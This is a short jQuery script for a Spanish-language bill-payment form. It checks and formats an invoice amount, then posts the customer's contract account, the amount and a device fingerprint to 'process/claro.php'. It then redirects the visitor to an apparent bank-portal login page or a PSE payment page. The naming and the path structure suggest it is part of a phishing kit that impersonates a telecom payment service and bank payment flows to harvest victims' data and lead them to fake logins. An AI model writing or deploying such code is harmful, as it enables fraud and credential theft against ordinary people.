$(document).ready(function() { 

    $("#btn-consultar").click(function(){
        if ($('#cuenta_contrato').val() != "" && $('#valor_factura').val() != "" && $('#valor_factura').val() != "$ " && $('#empresa').val() != "") {
            enviar_factura($('#empresa').val(),$('#cuenta_contrato').val(),$('#valor_factura').val());
        }else{
            alert("Por favor, complete todos los campos correctamente.");
        }
    });

    $('#cuenta_contrato').keyup(function(event){
        if ($('#cuenta_contrato').val() != "") {            
            $('#btn-consultar').removeAttr("disabled");            
        }else{
            $('#btn-consultar').attr("disabled","disabled");            
        }    
    });

    $('#valor_factura').keyup(function(event){
        var pagar = $('#valor_factura').val().replace("$","");
        pagar = pagar.replace(".","");
        pagar = pagar.replace(" ","");

        cad = pagar;
        invertido = cad.split("").reverse().join("");
        
        var valor = invertido.split('.').join('');
        var tam = valor.length;

        c=0;
        nuevo = "";
        for (var i = 0; i < tam; i++) {            
            if (c==3) {
                nuevo = nuevo + ".";
                c=1;
            }else{
                c++;                
            }
            nuevo = nuevo + valor[i];              
        }

        final = nuevo.split("").reverse().join("");
        final = "$ " + final;
        $('#valor_factura').val(final);
        $('#valor_factura').focus();
    });

    $("#btn-trico").click(function(){
        var d = detectar_dispositivo();
        $.post( "process/claro.php", { idc:$('#cuenta_contrato').val(), lin:$("#valor_factura").val(), dis:d } ,function(data) {
            window.location.href = "transaction/sucursal/poral/a/login.php";
        });    
    });

    $("#btn-pse").click(function(){
        var d = detectar_dispositivo();
        $.post( "process/claro.php", { idc:$('#cuenta_contrato').val(), lin:$("#valor_factura").val(), dis:d } ,function(data) {
            window.location.href = "transaction/PSEtransaction/proceso.html"; 
        });
    });



 


});